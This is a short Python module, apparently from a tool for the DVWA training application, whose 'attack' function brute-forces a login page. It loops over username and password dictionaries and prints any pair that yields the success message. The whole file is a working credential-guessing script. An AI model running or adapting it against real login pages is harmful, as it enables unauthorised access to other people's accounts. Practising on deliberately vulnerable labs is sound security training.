success_msg = 'Welcome to the password protected area'


def attack(session, dict_user, users, dict_pass, passw):
    usernames=[]
    passwords=[]

    # If users were given on command line, they have priority over the config file
    if not users:
        for file in dict_user:
            usernames.extend(open(file, "r", errors='replace').readlines())
    else:
        usernames.extend(users)

    # If passwords were given on command line, they have priority over the config file
    if not passw:
        for file in dict_pass:
            passwords.extend(open(file, "r", errors='replace').readlines())
    else:
        passwords.extend(passw)

    # Dictionary attack loop
    for u in usernames:
        u = u.rstrip('\n')
        for p in passwords:
            p = p.rstrip('\n')
            page_content = session.login('vulnerabilities/brute/', u, p)
            if success_msg in page_content:
                print("   Credentials found!\n   Username: {}\n   Password: {}\n".format(u,p))

